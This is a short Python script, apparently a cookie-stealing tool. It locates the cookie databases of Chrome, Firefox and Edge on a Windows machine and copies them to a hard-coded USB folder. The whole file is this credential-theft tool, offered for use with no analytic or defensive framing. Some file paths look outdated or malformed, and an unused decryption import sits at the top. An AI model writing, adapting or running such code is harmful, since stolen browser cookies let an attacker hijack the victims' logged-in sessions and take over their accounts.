import os

import shutil

import sqlite3

import win32crypt

def get_chrome_cookies():

    cookie_file = os.path.join(os.getenv('APPDATA'), r"..\Local\Google\Chrome\User Data\Default\Cookies")

    return cookie_file

def get_firefox_cookies():

    cookie_file = os.path.join(os.getenv('APPDATA'), r"Mozilla\Firefox\Profiles", os.listdir(os.path.join(os.getenv('APPDATA'), r"Mozilla\Firefox\Profiles"))[0], "cookies.sqlite")

    return cookie_file

def get_edge_cookies():

    cookie_file = os.path.join(os.getenv('LOCALAPPDATA'), r"Microsoft\Edge\User Data\Default\Cookies")

    return cookie_file

def copy_cookies(source_file, destination_path):

    destination_file = os.path.join(destination_path, os.path.basename(source_file))

    

    if os.path.exists(source_file):

        shutil.copy2(source_file, destination_file)

        print(f"Successfully copied cookies from {source_file} to {destination_file}")

    else:

        print(f"Unable to find cookies for {source_file}")

def copy_all_cookies(destination_path):

    browsers = [

        ("Google Chrome", get_chrome_cookies()),

        ("Mozilla Firefox", get_firefox_cookies()),

        ("Microsoft Edge", get_edge_cookies())

    ]

    for browser_name, cookie_file in browsers:

        copy_cookies(cookie_file, destination_path)

# Set the destination path to your desired USB location

destination_path = "E:\\CpCookies\\nazovpc"

copy_all_cookies(destination_path)

